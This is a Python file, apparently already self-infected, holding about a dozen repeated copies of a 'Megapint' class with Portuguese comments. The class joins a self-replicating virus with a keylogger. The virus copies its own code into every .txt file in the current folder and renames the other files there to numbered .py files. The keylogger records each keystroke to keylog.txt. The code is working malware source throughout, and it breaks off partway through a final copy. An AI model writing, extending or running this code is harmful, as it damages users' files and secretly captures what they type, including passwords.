        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
